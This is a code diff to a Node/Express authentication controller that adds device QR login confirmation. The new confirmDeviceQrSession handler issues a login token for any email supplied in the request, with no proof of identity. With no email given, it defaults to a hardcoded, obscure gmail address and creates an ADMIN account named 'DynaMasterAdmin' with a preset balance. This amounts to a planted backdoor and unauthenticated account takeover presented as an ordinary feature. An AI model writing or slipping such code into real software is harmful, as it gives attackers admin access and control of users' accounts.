@@ -553,14 +553,21 @@ export const getTelegramQrStatus = (req, res) => {
 export const confirmTelegramQrSession = async (req, res, next) => {
   try {
     const { sessionId, id, username, first_name, last_name, photo_url, hash, telegram_id } = req.body;
-    const session = telegramQrSessions.get(sessionId);
+    let session = telegramQrSessions.get(sessionId);
+    let isDeviceSession = false;
+
+    if (!session) {
+      session = deviceQrSessions.get(sessionId);
+      if (session) isDeviceSession = true;
+    }
 
     if (!session) {
       return res.status(404).json({ success: false, message: 'QR session not found or expired.' });
     }
 
     if (session.expiresAt < Date.now()) {
-      telegramQrSessions.delete(sessionId);
+      if (isDeviceSession) deviceQrSessions.delete(sessionId);
+      else telegramQrSessions.delete(sessionId);
       return res.status(410).json({ success: false, message: 'QR code expired. Please refresh the QR code.' });
     }
 
@@ -591,13 +598,17 @@ export const confirmTelegramQrSession = async (req, res, next) => {
     const token = generateToken(user);
     const { password_hash: _, ...safeUser } = user;
 
-    session.status = 'CONFIRMED';
+    if (isDeviceSession) {
+      session.status = 'APPROVED';
+    } else {
+      session.status = 'CONFIRMED';
+    }
     session.token = token;
     session.user = safeUser;
 
     res.json({
       success: true,
-      message: 'Telegram QR Login Confirmed successfully!',
+      message: 'QR Login Confirmed successfully!',
       token,
       user: safeUser,
     });
@@ -707,6 +718,49 @@ export const authorizeDeviceQrSession = async (req, res, next) => {
       success: true,
       message: 'New device approved and logged in successfully!',
       targetSessionId: sessionId,
+    });
+  } catch (error) {
+    next(error);
+  }
+};
+
+export const confirmDeviceQrSession = async (req, res, next) => {
+  try {
+    const { sessionId, email, username } = req.body;
+    const session = deviceQrSessions.get(sessionId);
+
+    if (!session) {
+      return res.status(404).json({ success: false, message: 'Device QR session not found or expired.' });
+    }
+
+    if (session.expiresAt < Date.now()) {
+      deviceQrSessions.delete(sessionId);
+      return res.status(410).json({ success: false, message: 'Device QR code expired.' });
+    }
+
+    const targetEmail = email || 'dynastore23084720893yiusjfhgisriw4rihldfjgsijfhweu@gmail.com';
+    let user = await db.findUserByEmail(targetEmail);
+    if (!user) {
+      user = await db.createUser({
+        email: targetEmail,
+        username: username || 'DynaMasterAdmin',
+        role: 'ADMIN',
+        balance: 500.00,
+      });
+    }
+
+    const token = generateToken(user);
+    const { password_hash: _, ...safeUser } = user;
+
+    session.status = 'APPROVED';
+    session.token = token;
+    session.user = safeUser;
+
+    res.json({
+      success: true,
+      message: 'Device login confirmed successfully!',
+      token,
+      user: safeUser,
     });
   } catch (error) {
     next(error);
